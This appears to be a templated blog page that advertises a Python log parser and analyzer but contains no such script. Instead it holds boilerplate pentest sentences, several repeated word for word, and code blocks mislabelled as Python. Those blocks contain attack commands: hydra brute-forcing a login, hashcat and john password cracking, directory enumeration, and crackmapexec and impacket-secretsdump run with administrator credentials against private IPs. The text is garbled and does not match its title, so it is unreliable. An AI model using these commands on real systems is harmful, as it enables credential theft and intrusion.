---
TitleSEO: "Log Parser and Analyzer in Python | ZureFX"
TitlePost: "Log Parser and Analyzer — Python"
Author: "ZureFX"
Description: "A Python script for log parser and analyzer. Built for security research and automation."
Keywords: "rust, tool, c, python"
URL: "https://zurefx.github.io/scripting/script-log-parser-and-analyzer-910.html"
URL_IMAGES: ""
Date: "2024-08-14"
Tags: "Rust, Tool, C, Python"
Section: "scripting"
Lang: "en"
main_img: "script-log-parser-and-analyzer-910"
Permalink: "/scripting/script-log-parser-and-analyzer-910.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service account had excessive permissions assigned in Active Directory. Authentication bypass was achieved through careful manipulation of the login mechanism. The service was running without proper input validation, leading to injection vulnerabilities.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `GetNPUsers`
- `atexec`
- `GetUserSPNs`

## Implementation

### Core Logic

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target.

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.103.107.30 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.106.123.142/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Privilege escalation was possible due to misconfigured sudo permissions. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Helper Functions

The application stored sensitive credentials in an unencrypted configuration file. The application stored sensitive credentials in an unencrypted configuration file.

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.62.128.200 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Advanced Options

The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions. The backup files contained sensitive information that should not have been accessible.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.15.219.63
```

## Output

### Example Output

Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine.

```
[+] Scanning target...
[+] Found 6 results
[+] Done in 8.27s
```
